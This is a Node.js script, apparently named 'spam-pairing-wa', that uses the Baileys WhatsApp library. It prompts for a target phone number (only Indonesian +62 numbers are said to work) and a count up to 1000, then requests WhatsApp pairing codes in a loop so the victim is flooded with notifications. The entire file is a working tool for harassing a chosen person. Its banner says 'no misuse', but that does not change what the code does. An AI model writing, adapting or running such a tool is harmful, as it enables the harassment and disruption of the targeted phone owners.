const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function LuciferProject() {
    const { state } = await useMultiFileAuthState('./69/session');
    const LuciferBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        // Nomor target
        const phoneNumber = await question(wColor + 'ターゲット番号を入力してください (例: 62xxxxxxx): ' + xColor);

        // Jumlah spam
        const totalSpam = parseInt(await question(wColor + 'スパム回数を入力してください (1-1000): ' + xColor));

        if (isNaN(totalSpam) || totalSpam <= 0) {
            console.log('例: 20 と入力してください。');
            return;
        }

        for (let i = 0; i < totalSpam; i++) {
            try {
                let code = await LuciferBot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(wColor + `スパムペアリングコード成功 - 番号: ${phoneNumber} 進捗: [${i + 1}/${totalSpam}]` + xColor);
            } catch (error) {
                console.error('エラー:', error.message);
            }
        }
    } catch (error) {
        console.error('エラーが発生しました。');
    }

    return LuciferBot;
}

console.log(wColor + `
実行中... spam-pairing-wa
=========================
 • spam-pairing-wa
 • 作成者: FlowFalcon
 • 悪用禁止
=========================
┏❐ 
┃ 【使用手順】
┃
┃ ⭔ ターゲット番号を入力してください (例: 62xxxxxxx)
┃ ⭔ スパム回数を入力してください (1-1000)
┃
┃ 【このツールは+62の番号のみ対応しています】
┗❐ 
=========================` + xColor);

LuciferProject();
